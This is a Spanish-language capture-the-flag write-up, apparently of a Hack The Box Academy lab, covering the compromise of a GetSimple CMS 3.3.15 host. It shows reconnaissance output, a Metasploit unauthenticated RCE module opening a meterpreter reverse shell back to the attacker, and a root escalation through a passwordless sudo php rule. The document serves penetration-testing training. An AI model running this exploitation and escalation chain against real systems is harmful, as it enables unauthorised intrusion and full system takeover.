# **<u>Getting Started</u>**

## Enumeración y reconocimiento

Empiezo a escanear con nmap.

```js
┌──(kali㉿kali)-[~/htb-academy/verificacion_de_conocimientos]
└─$ nmap -sCV -p- 10.129.87.77 -oA verificacion-final
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 16:27 CEST
Nmap scan report for 10.129.87.77
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c73a025f5fe817b822b3649a54dc85e (RSA)
|   256 e1c056d052042f3cac9ae7b1792bbb13 (ECDSA)
|_  256 523147140dc38e1573e3c424a23a1277 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.94 seconds
```

- "80/tcp open http" indica que el puerto TCP 80 está abierto y que el servicio que se está ejecutando en él es HTTP. 

- "Apache httpd 2.4.41 ((Ubuntu))" indica que el servidor web Apache está siendo utilizado en el sistema, con la versión 2.4.41 y que el sistema operativo es Ubuntu.

- "http-robots.txt: 1 disallowed entry /admin/" indica que se encontró un archivo robots.txt en el servidor HTTP y que contiene una única entrada que prohíbe a los robots de búsqueda el acceso a la ruta /admin/. El archivo robots.txt se utiliza para proporcionar instrucciones a los robots de búsqueda de los motores de búsqueda para que sepan qué páginas o secciones del sitio web deben o no rastrear.

- "http-title: Welcome to GetSimple! - gettingstarted" indica que la página de inicio del sitio web es "Welcome to GetSimple! - gettingstarted". El título de la página se encuentra dentro de las etiquetas HTML <title></title>.

- "http-server-header: Apache/2.4.41 (Ubuntu)" indica que el servidor HTTP es Apache y está ejecutando la versión 2.4.41 en Ubuntu.

- "Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel" indica que el sistema operativo subyacente es Linux, y se especifica el CPE (Common Platform Enumeration) correspondiente.

Entro en la web.

![](/assets/images/1-getting-started/1-web.png)

GetSimple CMS es un sistema de gestión de contenido (CMS) de código abierto y gratuito que permite a los usuarios crear y administrar fácilmente sitios web dinámicos.

GetSimple CMS está diseñado para ser simple y fácil de usar, por lo que no requiere conocimientos técnicos avanzados para utilizarlo. Ofrece una interfaz de usuario intuitiva y un conjunto de herramientas para crear y editar contenido web sin la necesidad de escribir código.

**El CMS GetSimple se basa en PHP y utiliza una base de datos SQLite o MySQL para almacenar el contenido**. Ofrece una amplia gama de características, incluyendo plantillas personalizables, una biblioteca de complementos y widgets, soporte multilingüe y gestión de permisos de usuario.

GetSimple CMS es utilizado por individuos, pequeñas empresas y organizaciones que buscan crear sitios web de manera rápida y fácil sin tener que aprender habilidades técnicas avanzadas.

```js
┌──(kali㉿kali)-[~/htb-academy/verificacion_de_conocimientos]
└─$ whatweb 10.129.87.77                    
http://10.129.87.77 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.87.77], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]          

┌──(kali㉿kali)-[~/htb-academy/verificacion_de_conocimientos]
└─$ whatweb  http://10.129.87.77/admin
http://10.129.87.77/admin [301 Moved Permanently] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.87.77], RedirectLocation[http://10.129.87.77/admin/], Title[301 Moved Permanently] 
http://10.129.87.77/admin/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.87.77], JQuery[1.7.1], PasswordField[pwd], Script[text/javascript], Title[gettingstarted » Login], X-Frame-Options[SAMEORIGIN]  
```

La salida proporcionada es el resultado de un análisis web con la herramienta WhatWeb en el sitio web que se encuentra en http://10.129.87.77/admin.

- En la primera línea, se indica que el sitio web ha sido redireccionado (HTTP 301 Moved Permanently) desde http://10.129.87.77/admin a http://10.129.87.77/admin/.

- En la segunda línea, se proporciona información sobre la página de destino http://10.129.87.77/admin/. Se indica que el servidor web utilizado es Apache versión 2.4.41, que el servidor HTTP se ejecuta en Ubuntu Linux, y se proporciona la dirección IP del servidor.

- La línea 2 también indica que el sitio web está en HTML5, se utiliza el framework JQuery versión 1.7.1, la página de inicio tiene un campo de contraseña (PasswordField) llamado 'pwd', hay un script JavaScript en la página y el título de la página es "gettingstarted » Login".

- La línea final indica que el sitio web utiliza la cabecera HTTP X-Frame-Options con el valor SAMEORIGIN. La cabecera X-Frame-Options se utiliza para controlar si una página puede ser mostrada dentro de un marco o iframe en otro sitio web. El valor SAMEORIGIN indica que la página solo puede ser cargada en un marco del mismo origen (mismo dominio). Esto ayuda a prevenir ataques como clickjacking.

Continuo con gobuster para obtener mas información.

```js
┌──(kali㉿kali)-[~/htb-academy/verificacion_de_conocimientos]
└─$ gobuster dir -u http://10.129.87.77/admin/ -w /usr/share/dirb/wordlists/common.txt -o gobuster.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.87.77/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/27 17:18:29 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/inc                  (Status: 301) [Size: 316] [--> http://10.129.87.77/admin/inc/]
/index.php            (Status: 200) [Size: 2623]
/lang                 (Status: 301) [Size: 317] [--> http://10.129.87.77/admin/lang/]
/template             (Status: 301) [Size: 321] [--> http://10.129.87.77/admin/template/]
Progress: 4610 / 4615 (99.89%)
===============================================================
2023/03/27 17:18:51 Finished
===============================================================
```

Se encontraron tres directorios: /inc, /lang y /template. Cada uno de ellos devuelve un código de estado 301 (redirección).

 /index.php se encontró con un código de estado 200, lo que indica que la página se encontró y se pudo acceder a ella correctamente. El tamaño de la página es 2623 bytes.

Es posible que este archivo contenga información útil sobre la página web, por lo que se podría examinar su contenido para obtener más información sobre el sitio web. También se podría realizar una enumeración adicional en este archivo en busca de otras rutas o archivos que puedan ser útiles para la evaluación de vulnerabilidades o la explotación. 

La herramienta también muestra las nuevas URL a las que se ha redirigido cada directorio.

```js
┌──(kali㉿kali)-[~/htb-academy/verificacion_de_conocimientos]
└─$ gobuster dir -u http://10.129.87.77/admin/inc -w /usr/share/dirb/wordlists/common.txt -o gobuster-2.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.87.77/admin/inc
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/27 17:37:58 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/tmp                  (Status: 301) [Size: 320] [--> http://10.129.87.77/admin/inc/tmp/]
Progress: 4588 / 4615 (99.41%)
===============================================================
2023/03/27 17:38:19 Finished
===============================================================
```

```js
┌──(kali㉿kali)-[~/htb-academy/verificacion_de_conocimientos]
└─$ gobuster dir -u http://10.129.87.77/admin/template -w /usr/share/dirb/wordlists/common.txt -o gobuster-3.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.87.77/admin/template
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/27 17:39:35 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 328] [--> http://10.129.87.77/admin/template/images/]
/js                   (Status: 301) [Size: 324] [--> http://10.129.87.77/admin/template/js/]
Progress: 4606 / 4615 (99.80%)
===============================================================
2023/03/27 17:39:57 Finished
===============================================================
```

Después de escanear con gobuster los 4 directorios que se encontraron anteriormente solo han dado resultados /inc y /template.

<img title="" src="file:///home/kali/htb-academy/verificacion_de_conocimientos/2.png" alt="" width="469" data-align="center">

En el directorio /tmp se puede comprobar la versión de GetSimple a la que corresponde que es la 3.3.15. Busco un exploit  poniendo en el buscador *getsimple 3.3.15 exploit* y encuentro lo siguiente.

![](/assets/images/1-getting-started/3.png)

En la terminal con el comando *searsploit* busco *getsimple* y obtengo varios resultados.

```js
┌──(kali㉿kali)-[~/htb-academy/verificacion_de_conocimientos]
└─$ searchsploit getsimple     
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Getsimple CMS 2.01 - 'changedata.php' Cross-Site Scripting                        | php/webapps/34789.html
Getsimple CMS 2.01 - 'components.php' Cross-Site Scripting                        | php/webapps/34041.txt
Getsimple CMS 2.01 - Local File Inclusion                                         | php/webapps/12517.txt
Getsimple CMS 2.01 - Multiple Vulnerabilities                                     | php/webapps/14338.html
Getsimple CMS 2.01 < 2.02 - Administrative Credentials Disclosure                 | php/webapps/15605.txt
Getsimple CMS 2.03 - 'upload-ajax.php' Arbitrary File Upload                      | php/webapps/35353.txt
Getsimple CMS 3.0 - 'set' Local File Inclusion                                    | php/webapps/35726.py
Getsimple CMS 3.1.2 - 'path' Local File Inclusion                                 | php/webapps/37587.txt
Getsimple CMS 3.2.1 - Arbitrary File Upload                                       | php/webapps/25405.txt
GetSimple CMS 3.3.1 - Cross-Site Scripting                                        | php/webapps/43888.txt
Getsimple CMS 3.3.1 - Persistent Cross-Site Scripting                             | php/webapps/32502.txt
Getsimple CMS 3.3.10 - Arbitrary File Upload                                      | php/webapps/40008.txt
GetSimple CMS 3.3.13 - Cross-Site Scripting                                       | php/webapps/44408.txt
GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting                            | php/webapps/49726.py
GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting (Authenticated)            | php/webapps/48850.txt
GetSimple CMS 3.3.4 - Information Disclosure                                      | php/webapps/49928.py
GetSimple CMS Custom JS 0.1 - Cross-Site Request Forgery                          | php/webapps/49816.py
Getsimple CMS Items Manager Plugin - 'PHP.php' Arbitrary File Upload              | php/webapps/37472.php
GetSimple CMS My SMTP Contact Plugin 1.1.1 - Cross-Site Request Forgery           | php/webapps/49774.py
GetSimple CMS My SMTP Contact Plugin 1.1.2 - Persistent Cross-Site Scripting      | php/webapps/49798.py
GetSimple CMS Plugin Multi User 1.8.2 - Cross-Site Request Forgery (Add Admin)    | php/webapps/48745.txt
GetSimpleCMS - Unauthenticated Remote Code Execution (Metasploit)                 | php/remote/46880.r
```

Asi que me decido en desplegar* metasploit* con el comando *msfconsole* y vuelvo a buscar *getsimple*.

```js
msf6 > search getsimple

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    GetSimpleCMS PHP File Upload Vulnerability
   1  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE
```

Elijo la segunda opción que es la versión más actual y configuro el exploit.

```js
msf6 > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > show options

Module options (exploit/multi/http/getsimplecms_unauth_code_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the cms
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.129    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   GetSimpleCMS 3.3.15 and before



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set RHOSTS  10.129.87.77
RHOSTS => 10.129.87.77
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set LHOST 10.10.14.178
LHOST => 10.10.14.178
msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.178:4444 
[*] Sending stage (39927 bytes) to 10.129.87.77
[*] Meterpreter session 1 opened (10.10.14.178:4444 -> 10.129.87.77:48986) at 2023-03-27 18:07:56 +0200

meterpreter > pwd
/var/www/html/theme
```

Obtengo acceso y empiezo a navegar con *meterpreter*.

```js
meterpreter > cd mrb3n
meterpreter > ls
Listing: /home/mrb3n
====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
020666/rw-rw-rw-  0      cha   2023-03-27 16:23:02 +0200  .bash_history
100644/rw-r--r--  220    fil   2020-02-25 13:03:22 +0100  .bash_logout
100644/rw-r--r--  3771   fil   2020-02-25 13:03:22 +0100  .bashrc
040700/rwx------  4096   dir   2021-02-09 10:12:07 +0100  .cache
100644/rw-r--r--  807    fil   2020-02-25 13:03:22 +0100  .profile
100644/rw-r--r--  0      fil   2021-02-09 11:56:38 +0100  .sudo_as_admin_successful
100600/rw-------  10332  fil   2021-05-07 16:28:39 +0200  .viminfo
100664/rw-rw-r--  33     fil   2021-02-16 12:00:55 +0100  user.txt

meterpreter > cat user.txt
```

Y por fin localizo la primera flag en */home/mrb3n.*

Ahora a escalar privilegios. Lo primero que hago es listar los permisos que tiene el usuario actual para ejecutar comandos con el comando "sudo".

```bash
meterpreter > sudo -l
[-] Unknown command: sudo
meterpreter > shell
Process 1855 created.
Channel 0 created.
sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

Se puede ver que el siguiente binario no requiere password *(ALL : ALL) NOPASSWD: /usr/bin/php*

Busco en [gtfobins]([https://gtfobins.github.io/](https://gtfobins.github.io/)) el binario php y encuentro lo siguiente.

![](/assets/images/1-getting-started/6.png)

Aplico las dos anteriores lineas de comandos y consigo acceso a *root* y desde esta posición busco y encuentro la *flag* de root.

```bash
CMD="/bin/sh"
sudo php -r "system('$CMD');"
whoami
root
cd root
ls
root.txt
snap
cat root.txt
```
